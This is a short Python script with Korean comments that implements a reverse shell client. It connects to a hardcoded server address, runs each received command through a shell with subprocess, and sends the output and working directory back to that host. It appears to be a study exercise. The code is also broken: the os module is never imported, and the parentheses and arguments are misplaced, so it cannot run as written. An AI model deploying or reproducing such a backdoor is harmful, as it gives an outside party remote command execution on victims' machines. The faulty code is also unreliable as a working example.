import socket
import sys
import subprocess

#소켓실행해 변수선언
s = socket.socket()

#서버pc의 ip할당(이 ip로 클라이언트가 찾아오게 함)
host = '192.168.0.5'
port = 9999
s.connect((host, port))

while True: #종료 명령전 무한루프
    data = s.recv(2048) #소켓 버퍼사이즈 정하고 data변수에 담기
    if data[:2].decode("utf-8") == 'cd': #CLI에서 첫 두글자 cd일 때
        os.chdir(data[3:]).decode("utf-8"))
    if len(data) > 0: #데이터 길이 초과시
        cmd = subprocess.Popen(data[:].decode("utf-8", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE))#파이썬에서 쉘스크립트짤 때 사용하는 subprocess모듈 이용한 리턴값을  cmd변수
        output_bytes = cmd.stdout.read() + cmd.stderr.read() #표준출력과 에러를가져옴. (이진비트로)
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '>'))#client실행 값 서버로 보내기
        print(output_str)#Test
s.close()